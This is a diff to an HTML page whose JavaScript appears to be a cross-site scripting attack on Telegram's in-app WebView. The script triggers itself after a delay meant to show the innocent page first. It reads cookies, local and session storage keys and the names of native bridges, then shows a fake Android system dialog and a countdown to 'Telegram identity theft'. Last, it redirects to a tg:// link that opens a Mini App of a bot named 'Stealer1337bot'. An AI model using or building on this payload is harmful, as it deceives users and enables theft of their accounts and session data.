@@ -28,10 +28,10 @@
 </div>
 <script>
 function xssProof() {
-  // Pop alert XSS proof
-  try { alert('XSS in Telegram WebView\n\nOrigin: ' + location.origin + '\nDomain: ' + document.domain + '\nCookies: ' + (document.cookie || 'none')); } catch(e) {}
+  // ---- STEP 1: Change document.title (visible in browser chrome) ----
+  document.title = '\u26A0 XSS \u2014 JS Executed on ' + document.domain;
 
-  // Collect accessible data
+  // ---- Collect data while alert shows ----
   var cookies = document.cookie || '(none)';
   var lsKeys = [];
   try {
@@ -49,7 +49,6 @@ function xssProof() {
     }
   } catch(e) {}
 
-  // Check for Telegram JS bridges
   var bridges = [];
   var bridgeNames = ['TelegramWebviewProxy','TelegramGameProxy','TelegramWebview','__tg__','Telegram','Android','app','native'];
   for (var j = 0; j < bridgeNames.length; j++) {
@@ -81,7 +80,67 @@ function xssProof() {
     }));
   } catch(e) {}
 
-  // Transform the page into XSS proof display
+  // ---- STEP 2: Show fake Android AlertDialog overlay on the ORIGINAL page ----
+  var overlay = document.createElement('div');
+  overlay.id = 'xss-overlay';
+  overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);z-index:99999;display:flex;align-items:center;justify-content:center';
+
+  var dialog = document.createElement('div');
+  dialog.style.cssText = 'background:#fff;border-radius:28px;padding:24px;width:300px;max-width:85%;box-shadow:0 8px 40px rgba(0,0,0,0.3);font-family:Roboto,sans-serif';
+
+  var title = document.createElement('div');
+  title.style.cssText = 'font-size:18px;font-weight:500;color:#1a1a1a;margin-bottom:16px';
+  title.textContent = 'JavaScript Execution';
+
+  var msg = document.createElement('div');
+  msg.style.cssText = 'font-size:14px;color:#444;line-height:1.5;margin-bottom:20px';
+  msg.innerHTML = 'Arbitrary code execution confirmed in Telegram WebView.<br><br>'
+    + '<b>Origin:</b> ' + esc(location.origin) + '<br>'
+    + '<b>Domain:</b> ' + esc(document.domain) + '<br>'
+    + '<b>Bridges:</b> ' + esc(bridges.length ? bridges[0].split(' ')[0] : 'none') + '<br>'
+    + '<b>Cookies:</b> ' + esc(cookies.substring(0, 40));
+
+  var btnRow = document.createElement('div');
+  btnRow.style.cssText = 'text-align:right';
+
+  var okBtn = document.createElement('button');
+  okBtn.style.cssText = 'background:none;border:none;color:#5b9bd5;font-size:14px;font-weight:600;padding:8px 16px;cursor:pointer;letter-spacing:0.5px';
+  okBtn.textContent = 'OK';
+  okBtn.onclick = function() { dismissAlert(); };
+
+  btnRow.appendChild(okBtn);
+  dialog.appendChild(title);
+  dialog.appendChild(msg);
+  dialog.appendChild(btnRow);
+  overlay.appendChild(dialog);
+  document.body.appendChild(overlay);
+
+  // ---- STEP 3: Auto-dismiss after 3s, then show full XSS proof ----
+  var countdown = 3;
+  var cdLabel = document.createElement('div');
+  cdLabel.style.cssText = 'font-size:11px;color:#999;margin-top:8px;text-align:center';
+  cdLabel.textContent = 'Auto-dismiss in ' + countdown + 's...';
+  dialog.appendChild(cdLabel);
+
+  var alertTimer = setInterval(function() {
+    countdown--;
+    if (countdown > 0) {
+      cdLabel.textContent = 'Auto-dismiss in ' + countdown + 's...';
+    } else {
+      clearInterval(alertTimer);
+      dismissAlert();
+    }
+  }, 1000);
+
+  function dismissAlert() {
+    clearInterval(alertTimer);
+    var ov = document.getElementById('xss-overlay');
+    if (ov) ov.remove();
+    showProofDisplay(cookies, lsKeys, ssKeys, bridges);
+  }
+}
+
+function showProofDisplay(cookies, lsKeys, ssKeys, bridges) {
   var el = document.body;
   el.style.background = '#0d1117';
   el.style.color = '#c9d1d9';
@@ -134,16 +193,16 @@ function xssProof() {
   html += '<div style="color:#7ee787;font-size:10px;word-break:break-all">' + esc(navigator.userAgent) + '</div>';
   html += '</div>';
 
-  html += '<div id="cd" style="text-align:center;color:#ff0040;margin-top:18px;font-size:13px;padding:10px;border:1px solid #30363d;border-radius:6px;background:#161b22">Stealing Telegram identity in 6s...</div>';
+  html += '<div id="cd" style="text-align:center;color:#ff0040;margin-top:18px;font-size:13px;padding:10px;border:1px solid #30363d;border-radius:6px;background:#161b22">Chaining to Telegram identity theft in 5s...</div>';
 
   el.innerHTML = html;
 
   // Countdown then chain to Mini App
-  var sec = 6;
+  var sec = 5;
   var timer = setInterval(function() {
     sec--;
     var cdEl = document.getElementById('cd');
-    if (cdEl) cdEl.textContent = 'Stealing Telegram identity in ' + sec + 's...';
+    if (cdEl) cdEl.textContent = 'Chaining to Telegram identity theft in ' + sec + 's...';
     if (sec <= 0) {
       clearInterval(timer);
       location.href = 'tg://resolve?domain=Stealer1337bot&start=auto&startapp=x';
@@ -157,10 +216,10 @@ function esc(s) {
   return d.innerHTML;
 }
 
-// Auto-trigger
+// Auto-trigger after short delay so viewer sees the innocent page first
 setTimeout(function() {
   document.getElementById('trigger').click();
-}, 500);
+}, 2000);
 </script>
 </body>
 </html>
